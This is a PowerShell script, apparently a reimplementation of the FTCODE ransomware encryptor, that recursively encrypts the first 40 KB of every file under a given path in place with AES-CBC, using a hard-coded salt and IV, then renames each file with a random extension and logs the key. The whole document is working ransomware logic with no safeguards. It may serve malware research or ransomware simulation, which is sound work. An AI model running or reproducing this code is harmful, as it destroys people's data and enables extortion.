function Invoke-FTencryptor{

  [CmdletBinding()]

    Param(
      [Parameter(Mandatory=$true)][string]$Path,
      [Parameter(Mandatory=$false)][string]$Extension=$null,
      [Parameter(Mandatory=$false)][string]$Pass=$null,
      [Parameter(Mandatory=$false)][string]$LogPath=(get-location).Path + '\ftcode_ek_ext'+'.log',
      [Parameter(Mandatory=$false)][int]$MaxByteSize2Encrypt=[int]40960,
      [Parameter(Mandatory=$false)][string]$Version="1018.1"
    )
    function FtEncrypt($bytefilein, $passin){
        
        $salt="BXCODE hack your system"
        $init="BXCODE INIT"
        $RijndaelObj = New-Object System.Security.Cryptography.RijndaelManaged  
        $bytepass = [Text.Encoding]::UTF8.GetBytes($passin)
        $salt = [Text.Encoding]::UTF8.GetBytes($salt)
        $RijndaelObj.Key = (New-Object Security.Cryptography.PasswordDeriveBytes $bytepass, $salt, "SHA1", 5).GetBytes(32)
        $RijndaelObj.IV = (New-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15]
        $RijndaelObj.Padding="Zeros"
        $RijndaelObj.Mode="CBC"
        $encryptor = $RijndaelObj.CreateEncryptor();
        $memorystream = New-Object IO.MemoryStream
        $cryptostream = New-Object Security.Cryptography.CryptoStream $memorystream,$encryptor,"Write"
        $cryptostream.Write($bytefilein, 0,$bytefilein.Length)
        $cryptostream.Close()
        $memorystream.Close()
        $RijndaelObj.Clear()
        return $memorystream.ToArray()
      }
      
    if (-Not ($Pass))
      {
        $Pass = get-random -count 50 -input (48..57 + 65..90 + 97..122) | foreach-object -begin { $p = $null } -process {$p += [char]$_} -end {$p}; 
      }
    if ( -Not ($Extension))
      {
        $Extension = ([string][guid]::NewGuid()).Substring(0,6)
      }

    $files=Get-ChildItem -path $Path -Force -Recurse -ErrorAction SilentlyContinue | ?{ -Not $_.PSIsContainer }

    foreach ($fileinput in $files)

      {
        try
          {
            $fin=[io.file]::Open($fileinput.Fullname, 'Open', 'ReadWrite');
          }
        catch
          {
            Write-Verbose "[!] Error, skipping file: $($fileinput.FullName)"
            return
          }
        
        $len=$fin.Length

        if ($fin.Length -lt $MaxByteSize2Encrypt)
        {
            $len=$fin.Length
        }

        else
            {
                $len=$MaxByteSize2Encrypt
            }
        Try

          {

            [byte[]]$ByteObj = new-object byte[] $len
            $ByteFile = $fin.Read($ByteObj, 0, $ByteObj.Length)
            $fin.Position='0'
            $encryptedbytes= FtEncrypt $ByteObj $Pass
            write-Verbose "[*] Encrypting $($fileinput.FullName) with the following length: $($encryptedbytes.Length)"
            $fin.Write($encryptedbytes, 0, $encryptedbytes.Length)
            $fin.Close()
            $NewName=$fileinput.Name+".$Extension"
            Rename-Item -Path $fileinput.FullName -NewName $NewName -Force

          }

        Catch
          {
            Write-Verbose "[!] Error, failed to encrypt following file $($fileinput.FullName)"
            $fin.Close()
            return
          }
      }
    if (Test-Path $LogPath)
      {
          if ( -Not ( Test-Path $LogPath -PathType Leaf ) )
              {
                  Write-Verbose "[!] Error: the backup path must be a directory"
                  return
              }
      }
    else
      {
          New-item -Path $LogPath -ItemType File -Force
      }

    Write-Host "[Parameters] -Pass $Pass -Extension $Extension"
    Add-Content -Path $LogPath -Value "$((get-date).tostring("MM-dd-yyyy")): -Pass $Pass -Extension $Extension"
    Write-Host "[*] Ek and Ext logged to $LogPath"
  }